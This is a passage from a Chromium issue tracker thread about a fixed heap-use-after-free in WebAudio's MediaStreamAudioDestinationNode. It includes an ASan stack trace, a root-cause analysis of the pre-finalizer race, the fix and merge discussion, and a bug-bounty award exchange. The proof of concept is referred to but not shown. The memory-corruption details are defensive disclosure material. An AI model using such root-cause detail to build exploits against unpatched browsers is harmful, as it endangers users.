    #11 0x627633214ecf in mojo::internal::MultiplexRouter::Accept(mojo::Message*) ./../../mojo/public/cpp/bindings/lib/multiplex_router.cc:734:7
    #12 0x627633205e8a in mojo::MessageDispatcher::Accept(mojo::Message*) ./../../mojo/public/cpp/bindings/lib/message_dispatcher.cc:43:19
    #13 0x6276331dfc2a in mojo::Connector::DispatchMessage(mojo::ScopedHandleBase<mojo::MessageHandle>) ./../../mojo/public/cpp/bindings/lib/connector.cc:563:49
    #14 0x6276331e13a0 in mojo::Connector::ReadAllAvailableMessages() ./../../mojo/public/cpp/bindings/lib/connector.cc:621:14
    #15 0x6276331e0dc9 in OnHandleReadyInternal ./../../mojo/public/cpp/bindings/lib/connector.cc:452:3
    #16 0x6276331e0dc9 in mojo::Connector::OnWatcherHandleReady(char const*, unsigned int) ./../../mojo/public/cpp/bindings/lib/connector.cc:418:3
    #17 0x6276331e2c3a in Invoke<void (Connector::*)(const char *, unsigned int), mojo::Connector *, const char *, unsigned int> ./../../base/functional/bind_internal.h:731:12
    #18 0x6276331e2c3a in MakeItSo<void (Connector::*const &)(const char *, unsigned int), const std::__Cr::tuple<base::internal::UnretainedWrapper<mojo::Connector, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>, base::internal::UnretainedWrapper<const char, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0> > &, unsigned int> ./../../base/functional/bind_internal.h:923:12
    #19 0x6276331e2c3a in RunImpl<void (Connector::*const &)(const char *, unsigned int), const std::__Cr::tuple<base::internal::UnretainedWrapper<mojo::Connector, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>, base::internal::UnretainedWrapper<const char, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0> > &, 0UL, 1UL> ./../../base/functional/bind_internal.h:1060:14
    #20 0x6276331e2c3a in base::internal::Invoker<base::internal::FunctorTraits<void (mojo::Connector::* const&)(char const*, unsigned int), mojo::Connector*, char const* const&>, base::internal::BindState<true, true, false, void (mojo::Connector::*)(char const*, unsigned int), base::internal::UnretainedWrapper<mojo::Connector, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>, base::internal::UnretainedWrapper<char const, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void (unsigned int)>::Run(base::internal::BindStateBase*, unsigned int) ./../../base/functional/bind_internal.h:980:12
    #21 0x627623163cbe in base::RepeatingCallback<void (unsigned int)>::Run(unsigned int) const & ./../../base/functional/callback.h:344:12
    #22 0x627623163a5f in Invoke<void (*const &)(const base::RepeatingCallback<void (unsigned int)> &, unsigned int, const mojo::HandleSignalsState &), const base::RepeatingCallback<void (unsigned int)> &, unsigned int, const mojo::HandleSignalsState &> ./../../base/functional/bind_internal.h:664:12
    #23 0x627623163a5f in MakeItSo<void (*const &)(const base::RepeatingCallback<void (unsigned int)> &, unsigned int, const mojo::HandleSignalsState &), const std::__Cr::tuple<base::RepeatingCallback<void (unsigned int)> > &, unsigned int, const mojo::HandleSignalsState &> ./../../base/functional/bind_internal.h:923:12
    #24 0x627623163a5f in RunImpl<void (*const &)(const base::RepeatingCallback<void (unsigned int)> &, unsigned int, const mojo::HandleSignalsState &), const std::__Cr::tuple<base::RepeatingCallback<void (unsigned int)> > &, 0UL> ./../../base/functional/bind_internal.h:1060:14
    #25 0x627623163a5f in base::internal::Invoker<base::internal::FunctorTraits<void (* const&)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), base::RepeatingCallback<void (unsigned int)> const&>, base::internal::BindState<false, true, false, void (*)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), base::RepeatingCallback<void (unsigned int)>>, void (unsigned int, mojo::HandleSignalsState const&)>::Run(base::internal::BindStateBase*, unsigned int, mojo::HandleSignalsState const&) ./../../base/functional/bind_internal.h:980:12
    #26 0x627633f588d0 in base::RepeatingCallback<void (unsigned int, mojo::HandleSignalsState const&)>::Run(unsigned int, mojo::HandleSignalsState const&) const & ./../../base/functional/callback.h:344:12
    #27 0x627633f58213 in mojo::SimpleWatcher::OnHandleReady(int, unsigned int, mojo::HandleSignalsState const&) ./../../mojo/public/cpp/system/simple_watcher.cc:278:14
    #28 0x627633f58cb6 in mojo::SimpleWatcher::Context::Notify(unsigned int, MojoHandleSignalsState, unsigned int) ./../../mojo/public/cpp/system/simple_watcher.cc:96:22
    #29 0x627633f55595 in mojo::SimpleWatcher::Context::CallNotify(MojoTrapEvent const*) ./../../mojo/public/cpp/system/simple_watcher.cc:61:14
    #30 0x62761e33cd2d in DispatchEvent ./../../mojo/core/ipcz_driver/mojo_trap.cc:612:3
    #31 0x62761e33cd2d in mojo::core::ipcz_driver::MojoTrap::DispatchOrQueueEvent(mojo::core::ipcz_driver::MojoTrap::Trigger&, MojoTrapEvent const&) ./../../mojo/core/ipcz_driver/mojo_trap.cc:584:5
    #32 0x62761e33f5f0 in mojo::core::ipcz_driver::MojoTrap::HandleEvent(IpczTrapEvent const&) ./../../mojo/core/ipcz_driver/mojo_trap.cc:466:3
    #33 0x62761e8343d1 in DispatchAll ./../../third_party/ipcz/src/ipcz/trap_event_dispatcher.cc:30:5
    #34 0x62761e8343d1 in ipcz::TrapEventDispatcher::~TrapEventDispatcher() ./../../third_party/ipcz/src/ipcz/trap_event_dispatcher.cc:12:3
    #35 0x62761e8179c1 in ipcz::Router::AcceptInboundParcel(std::__Cr::unique_ptr<ipcz::Parcel, std::__Cr::default_delete<ipcz::Parcel>>) ./../../third_party/ipcz/src/ipcz/router.cc:274:1
    #36 0x62761e7e6c38 in ipcz::NodeLink::AcceptCompleteParcel(ipcz::StrongAlias<ipcz::SublinkIdTag, unsigned long>, std::__Cr::unique_ptr<ipcz::Parcel, std::__Cr::default_delete<ipcz::Parcel>>) ./../../third_party/ipcz/src/ipcz/node_link.cc:1051:31
    #37 0x62761e7e583f in ipcz::NodeLink::OnAcceptParcel(ipcz::msg::AcceptParcel&) ./../../third_party/ipcz/src/ipcz/node_link.cc:642:10
    #38 0x62761e8051c9 in ipcz::msg::NodeMessageListener::OnTransportMessage(ipcz::DriverTransport::RawMessage const&, ipcz::DriverTransport const&, unsigned long) ./../../third_party/ipcz/src/ipcz/node_messages_generator.h:357:1
    #39 0x62761e7aa24c in Notify ./../../third_party/ipcz/src/ipcz/driver_transport.cc:129:20
    #40 0x62761e7aa24c in ipcz::(anonymous namespace)::NotifyTransport(unsigned long, void const*, unsigned long, unsigned long const*, unsigned long, unsigned int, IpczTransportActivityOptions const*) ./../../third_party/ipcz/src/ipcz/driver_transport.cc:47:11
    #41 0x62761e351ece in mojo::core::ipcz_driver::Transport::OnChannelMessage(void const*, unsigned long, std::__Cr::vector<mojo::PlatformHandle, std::__Cr::allocator<mojo::PlatformHandle>>, scoped_refptr<mojo::core::ipcz_driver::Envelope>) ./../../mojo/core/ipcz_driver/transport.cc:703:29
    #42 0x62761e31619c in mojo::core::Channel::TryDispatchMessage(base::span<char const, 18446744073709551615ul, char const*>, std::__Cr::optional<std::__Cr::vector<mojo::PlatformHandle, std::__Cr::allocator<mojo::PlatformHandle>>>, scoped_refptr<mojo::core::ipcz_driver::Envelope>, unsigned long*) ./../../mojo/core/channel.cc:1026:16
    #43 0x62761e314c45 in TryDispatchMessage ./../../mojo/core/channel.cc:970:10
    #44 0x62761e314c45 in mojo::core::Channel::OnReadComplete(unsigned long, unsigned long*) ./../../mojo/core/channel.cc:947:9
    #45 0x62761e35d94f in mojo::core::ChannelPosix::OnFdReadable(int) ./../../mojo/core/channel_posix.cc:307:12
    #46 0x6276335ef435 in OnFdReadable ./../../base/message_loop/message_pump_epoll.cc:764:13
    #47 0x6276335ef435 in base::MessagePumpEpoll::HandleEvent(int, bool, bool, base::MessagePumpEpoll::FdWatchController*) ./../../base/message_loop/message_pump_epoll.cc:672:17
    #48 0x6276335ee3da in base::MessagePumpEpoll::OnEpollEvent(base::MessagePumpEpoll::EpollEventEntry&, unsigned int) ./../../base/message_loop/message_pump_epoll.cc:618:7
    #49 0x6276335ec6f6 in base::MessagePumpEpoll::WaitForEpollEvents(base::TimeDelta) ./../../base/message_loop/message_pump_epoll.cc:509:7
    #50 0x6276335eb259 in base::MessagePumpEpoll::Run(base::MessagePump::Delegate*) ./../../base/message_loop/message_pump_epoll.cc:288:5
    #51 0x62763348904b in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:629:12
    #52 0x6276333999af in base::RunLoop::Run(base::Location const&) ./../../base/run_loop.cc:134:14
    #53 0x62763350c19c in base::Thread::Run(base::RunLoop*) ./../../base/threading/thread.cc:344:13
    #54 0x62763f913869 in content::(anonymous namespace)::ChildIOThread::Run(base::RunLoop*) ./../../content/child/child_process.cc:60:19
    #55 0x62763350c723 in base::Thread::ThreadMain() ./../../base/threading/thread.cc:416:3
    #56 0x627633561b49 in base::(anonymous namespace)::ThreadFunc(void*) ./../../base/threading/platform_thread_posix.cc:103:13
    #57 0x62761dd26b86 in asan_thread_start(void*) _asan_rtl_:28

Thread T4 (Chrome_ChildIOT) created by T0 (chrome) here:
    #0 0x62761dd0d381 in ___interceptor_pthread_create _asan_rtl_:3
    #1 0x627633561138 in base::(anonymous namespace)::CreateThread(unsigned long, bool, base::PlatformThreadBase::Delegate*, base::PlatformThreadHandle*, base::ThreadType, base::MessagePumpType) ./../../base/threading/platform_thread_posix.cc:151:13
    #2 0x62763350b4a3 in base::Thread::StartWithOptions(base::Thread::Options) ./../../base/threading/thread.cc:211:26
    #3 0x62763f9126fa in content::ChildProcess::ChildProcess(base::ThreadType, std::__Cr::unique_ptr<base::ThreadPoolInstance::InitParams, std::__Cr::default_delete<base::ThreadPoolInstance::InitParams>>) ./../../content/child/child_process.cc:125:3
    #4 0x62764b183ddb in content::RenderProcess::RenderProcess(std::__Cr::unique_ptr<base::ThreadPoolInstance::InitParams, std::__Cr::default_delete<base::ThreadPoolInstance::InitParams>>) ./../../content/renderer/render_process.cc:18:7
    #5 0x62764b1836a5 in content::RenderProcessImpl::RenderProcessImpl() ./../../content/renderer/render_process_impl.cc:112:7
    #6 0x62764b183bc0 in content::RenderProcessImpl::Create() ./../../content/renderer/render_process_impl.cc:227:31
    #7 0x62764b20a209 in content::RendererMain(content::MainFunctionParams) ./../../content/renderer/renderer_main.cc:287:53
    #8 0x627630171b40 in content::RunZygote(content::ContentMainDelegate*) ./../../content/app/content_main_runner_impl.cc:686:14
    #9 0x627630172abf in content::RunOtherNamedProcessTypeMain(std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&, content::MainFunctionParams, content::ContentMainDelegate*) ./../../content/app/content_main_runner_impl.cc:790:12
    #10 0x627630175345 in content::ContentMainRunnerImpl::Run() ./../../content/app/content_main_runner_impl.cc:1155:10
    #11 0x62763016f90b in content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner*) ./../../content/app/content_main.cc:359:36
    #12 0x62763016fe2b in content::ContentMain(content::ContentMainParams) ./../../content/app/content_main.cc:372:10
    #13 0x62761dd6493f in ChromeMain ./../../chrome/app/chrome_main.cc:222:12
    #14 0x739f0c829d8f in errx ??:?

SUMMARY: AddressSanitizer: heap-use-after-free (/home/sunburst/projects/fuzzframe/gen/browser/chrome/asan-linux-release-1444497/chrome+0xf7b1545) (BuildId: 87a681a21b42e59d)
Shadow bytes around the buggy address:
  0x71df0aedd380: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x71df0aedd400: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x71df0aedd480: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x71df0aedd500: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x71df0aedd580: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
=>0x71df0aedd600:[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x71df0aedd680: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x71df0aedd700: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x71df0aedd780: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x71df0aedd800: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x71df0aedd880: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

==1==ADDITIONAL INFO

==1==Note: Please include this section with the ASan report.
Task trace:


Command line: `/proc/self/exe --type=renderer --crashpad-handler-pid=46863 --enable-crash-reporter=, --user-data-dir=/home/fuzzing/projects/fuzzframe/gen/profiles/chrome/vtc64v51 --change-stack-guard-on-fork=enable --autoplay-policy=no-user-gesture-required --file-url-path-alias=/gen=/home/sunburst/projects/fuzzframe/gen/browser/chrome/asan-linux-release-1444497/gen --js-flags=--expose-gc --ozone-platform=wayland --lang=en-US --num-raster-threads=4 --enable-main-frame-before-activation --renderer-client-id=5 --time-ticks-at-unix-epoch=-1745217203902941 --launch-time-ticks=94430723725 --shared-files=v8_context_snapshot_data:100 --metrics-shmem-handle=4,i,6692731236206278754,12277848274437375339,2097152 --field-trial-handle=3,i,1470103085897019458,440167983655535239,262144 --disable-features=EyeDropper --variations-seed-version`


MiraclePtr Status: NOT PROTECTED
No raw_ptr<T> access to this region was detected prior to this crash.
This crash is still exploitable with MiraclePtr.
Refer to https://chromium.googlesource.com/chromium/src/+/main/base/memory/raw_ptr.md for details.

==1==END OF ADDITIONAL INFO
==1==ABORTING

```

### ch...@google.com (2025-04-22)

Setting milestone because of s2 severity.

### mj...@chromium.org (2025-04-22)

May be related to <https://crrev.com/c/6324771>

Maybe we need to hold [`destination_consumer_`](https://crsrc.org/c/third_party/blink/renderer/modules/webaudio/media_stream_audio_destination_handler.h;l=84) alive? `MediaStreamAudioDestinationHandler` doesn't own the memory.

### mj...@chromium.org (2025-04-22)

Reproduced on ASAN build from current tip-of-tree with the POC in [#comment8](https://issues.chromium.org/issues/412057896#comment8), launching chrome with --js-flags="--expose-gc"

### tg...@chromium.org (2025-04-22)

Michael, could you take a look then, and reassign it to me if this proves to be a `media::` issue rather than a WebAudio issue?

### mj...@chromium.org (2025-04-22)

Sure, I'm looking at it now.

MediaStreamAudioDestinationNode should be managing the memory for the destination\_consumer\_ in the handler (the `source_` [here](https://crsrc.org/c/third_party/blink/renderer/modules/webaudio/media_stream_audio_destination_node.cc;l=72;drc=b6620a02fa498df5297e53241b54a31f488ca440;bpv=1;bpt=1)). In `MediaStreamAudioDestinationNode::Dispose()` we remove the consumer from the handler, which should wait for the lock then prevent future callbacks. So I'm still not sure where the issue is.

### mj...@chromium.org (2025-04-22)

`Dispose()` is registered as the pre-finalizer for MediaStreamAudioDestinationNode.

### mj...@chromium.org (2025-04-22)

Maybe the MediaStreamSource is being collected before the MediaStreamAudioDestinationNode prefinalizer has a chance to run?

### mj...@chromium.org (2025-04-22)

I tried removing the MediaStreamSource prefinalizer, which fixed the race condition in this issue but introduced a different one. So I think I have identified the general area, but need some more work to find a solution.

### mj...@chromium.org (2025-04-23)

I think I have a fix.

As suggested in [#comment7](https://issues.chromium.org/issues/412057896#comment7), we can make MediaStreamAudioDestinationNode ActiveScriptWrappable and implement HasPendingActivity() to keep the node alive until the context is stopped, similar to MediaStreamAudioSourceNode and other ActiveScriptWrappable components in WebAudio.

This has the disadvantage of not collecting these nodes until the context is suspended or closed, but we generally don't expect developers to continually create these nodes on a running context.

Local testing showed no crash. I will put a CL up soon.

### mj...@chromium.org (2025-04-23)

Here is the CL: <https://crrev.com/c/6482260>

Reporter, if possible can you please try the patch from this CL and see if it fixes the POC from your end? Thank you for the detailed stack traces and POC, it made working on this much easier.

### mj...@chromium.org (2025-04-23)

For more detail about why this happened:

- The [pre-finalizer for MediaStreamSource](https://crsrc.org/c/third_party/blink/renderer/platform/mediastream/media_stream_source.cc;l=264) calls `platform_source_.reset()` which drops the buffers which are used by `MediaStreamAudioDestinationHandler::ConsumeAudio()`
- The call to `RemoveConsumer()` is done from the `MediaStreamAudioDestinationNode` pre-finalizer
- It seems like the pre-finalizers either don't run in a deterministic order, or the pre-finalizer for the `MedaiStreamSource` runs before the prefinalizer for `MediaStreamAudioDestinationNode`

So we potentially start dropping the memory before we remove the consumer, and thus there is a short window where `ConsumeAudio` can be called while the buffers are being dropped.

### mj...@chromium.org (2025-04-23)

It seems like ClusterFuzz run from [#comment4](https://issues.chromium.org/issues/412057896#comment4) ran before the updated POC in [#comment8](https://issues.chromium.org/issues/412057896#comment8), and wasn't able to reproduce the issue. Can someone from security help set up a fuzzer with the latest POC to help verify this fix? I'm not sure how to do this myself.

### fe...@gmail.com (2025-04-24)

I tested the patch from <https://crrev.com/c/6482260>. I think this patch successfully fixed the bug as there are no more crashes.

### dx...@google.com (2025-04-24)

Project: chromium/src  

Branch: main  

Author: Michael Wilson [mjwilson@chromium.org](mailto:mjwilson@chromium.org)  

Link:      <https://chromium-review.googlesource.com/6482260>

Make MediaStreamAudioDestinationNode ActiveScriptWrappable

---


Expand for full commit details
```
     
    Bug: 412057896 
    Change-Id: I482742448cd22d8a9bd57ac58847f796405d14e4 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6482260 
    Commit-Queue: Michael Wilson <mjwilson@chromium.org> 
    Reviewed-by: Kentaro Hara <haraken@chromium.org> 
    Reviewed-by: Hongchan Choi <hongchan@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1451160}

```

---

Files:

- M `third_party/blink/renderer/bindings/core/v8/active_script_wrappable_creation_key.h`
- M `third_party/blink/renderer/modules/webaudio/media_stream_audio_destination_node.cc`
- M `third_party/blink/renderer/modules/webaudio/media_stream_audio_destination_node.h`
- M `third_party/blink/renderer/modules/webaudio/media_stream_audio_destination_node.idl`

---

Hash: aa3e1b188a94da972cfbfaf47713ef5460cff25f  

Date:  Thu Apr 24 15:03:59 2025


---

### mj...@chromium.org (2025-04-24)

[#comment21](https://issues.chromium.org/issues/412057896#comment21) Thank you for verifying.

I will set this to fixed and request a merge to M136.

### mj...@chromium.org (2025-04-24)

I should wait at least 24 hours before requesting the merge.

### pe...@google.com (2025-04-25)

The NextAction date has arrived: 2025-04-25
To opt-out from this automation rule, please add Optout-Blintz-Nextaction-Alert to the "Chromium Labels" custom field.

### ch...@google.com (2025-04-25)

Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: andywu (ChromeOS), srinivassista (Desktop US), danielyip (Desktop EMEA), govind (Mobile US), eakpobaro (Mobile EMEA)

### mj...@chromium.org (2025-04-25)

> Why does your merge fit within the merge criteria for these milestones?

Chrome Browser: Important security issue (medium severity or higher)

> What changes specifically would you like to merge? Please link to Gerrit.

<https://crrev.com/c/6482260>

> Have the changes been released and tested on canary?

No, but the patch landed in 137.0.7145.0 and the reporter has manually verified the patch

> Is this a new feature?

No.

> If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

We should be able to verify it by running the reproduction case in [#comment8](https://issues.chromium.org/issues/412057896#comment8) using an ASAN build.

### sr...@google.com (2025-04-29)

We just ramped up M136 to 10% of users on stable and we will be reviewing data/feedback tomorrow, once we have good confidence , I will be revieiwng merges for respin for next week , on thursday, so please expect a update on these bugs on thursday of this week. 

If you think this is critical and cannot wait for next week respin, please reach out to me immiediately

### am...@chromium.org (2025-04-30)

no issues related to <https://crrev.com/c/6482260> in the five days since it's been on Canary, 136 merge approved
please merge this fix to branch 7103 by EOD Thursday, 1 May, so this fix can be included in next 136 Stable update

### dx...@google.com (2025-04-30)

Project: chromium/src  

Branch: refs/branch-heads/7103  

Author: Michael Wilson [mjwilson@chromium.org](mailto:mjwilson@chromium.org)  

Link:      <https://chromium-review.googlesource.com/6501741>

Make MediaStreamAudioDestinationNode ActiveScriptWrappable

---


Expand for full commit details
```
     
    (cherry picked from commit aa3e1b188a94da972cfbfaf47713ef5460cff25f) 
     
    Bug: 412057896 
    Change-Id: I482742448cd22d8a9bd57ac58847f796405d14e4 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6482260 
    Commit-Queue: Michael Wilson <mjwilson@chromium.org> 
    Reviewed-by: Kentaro Hara <haraken@chromium.org> 
    Reviewed-by: Hongchan Choi <hongchan@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1451160} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6501741 
    Reviewed-by: Rick Byers <rbyers@chromium.org> 
    Auto-Submit: Michael Wilson <mjwilson@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/7103@{#1786} 
    Cr-Branched-From: e09430c64983fc906f37a9f7e6806275c9b67b86-refs/heads/main@{#1440670}

```

---

Files:

- M `third_party/blink/renderer/bindings/core/v8/active_script_wrappable_creation_key.h`
- M `third_party/blink/renderer/modules/webaudio/media_stream_audio_destination_node.cc`
- M `third_party/blink/renderer/modules/webaudio/media_stream_audio_destination_node.h`
- M `third_party/blink/renderer/modules/webaudio/media_stream_audio_destination_node.idl`

---

Hash: e26c8a91ee3f017cff759ca681a58522cc29666a  

Date:  Wed Apr 30 22:46:45 2025


---

### pe...@google.com (2025-04-30)

LTS Milestone M132

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### mj...@chromium.org (2025-04-30)

> Was this issue a regression for the milestone it was found in?

I don't think so: the issue was reported as found in M135 and I don't see any changes that would have affect this that landed in that milestone.

> Is this issue related to a change or feature merged after the latest LTS Milestone?

Maybe: <https://crrev.com/c/6324771> modified this area of the code but it doesn't seem to be the cause because it landed in M136 and this issue was found in M135.

### qk...@google.com (2025-05-01)

Labelling as not applicable for LTS 132 because the suspected CL[1] was not included in M132 according to the comment #10.

[1] https://chromium-review.googlesource.com/c/chromium/src/+/6324771

### sp...@google.com (2025-05-02)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $7000.00 for this report.

Rationale for this decision:
report of memory corruption in a sandboxed process


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### fe...@gmail.com (2025-05-03)

Dear Chrome VRP Panel,

Thank you for your response and for acknowledging my recent vulnerability report. I appreciate the time and effort the panel has dedicated to reviewing my submission.

However, I would like to bring to your attention an important clarification regarding the report.

1. The account used to submit the vulnerability report was a new account that I unintentionally used due to forgetting to switch to my primary Google account, [sunburst.chromium@gmail.com](mailto:sunburst.chromium@gmail.com). This submission should be associated with my primary account, and I kindly request that the correct account be updated in your records.
2. Additionally, I would like to respectfully request a reevaluation of the reward amount. Based on the nature of the vulnerability—a high-quality report of memory corruption in a sandboxed process—I believe this submission meets the criteria for the higher reward tier of $10,000. I am confident that the technical details and impact of this vulnerability align with the standards set for such rewards in the Chrome VRP program.

If further information or clarification is needed to facilitate this reevaluation, I am happy to provide any additional details.

Thank you for your understanding and support. I look forward to your response.

Best regards

### am...@chromium.org (2025-05-05)

I've updated the reporter field to reflect your primary account.

> Additionally, I would like to respectfully request a reevaluation of the reward amount. Based on the nature of the vulnerability—a high-quality report of memory corruption in a sandboxed process—I believe this submission meets the criteria for the higher reward tier of $10,000. I am confident that the technical details and impact of this vulnerability align with the standards set for such rewards in the Chrome VRP program.

We did evaluate this bug to determine if it meet the bar for high-quality report during our original assessment of this issue. In reviewing this report as a whole, while we appreciated the additional effort to come up with a stable (c#3) and then a more reliably reproducible POC (c#8), those characteristics of this report are attributes expected for a baseline report (a reliable, easy to trigger POC) + symbolized ASAN stack trace). If anything these demonstrated that this isn't a mitigated UAF in the renderer and one that more realistically triggerable and potentially reachable to an attacker. There was no further technical details, RCA, other analysis or other attributes that would make this report stand out as high-quality versus baseline.

### fe...@gmail.com (2025-05-05)

Well, I didn't have a clear understanding of the standards for high - quality vulnerability reports before.
Thank you for your reply.

### ch...@google.com (2025-08-01)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/412057896)*
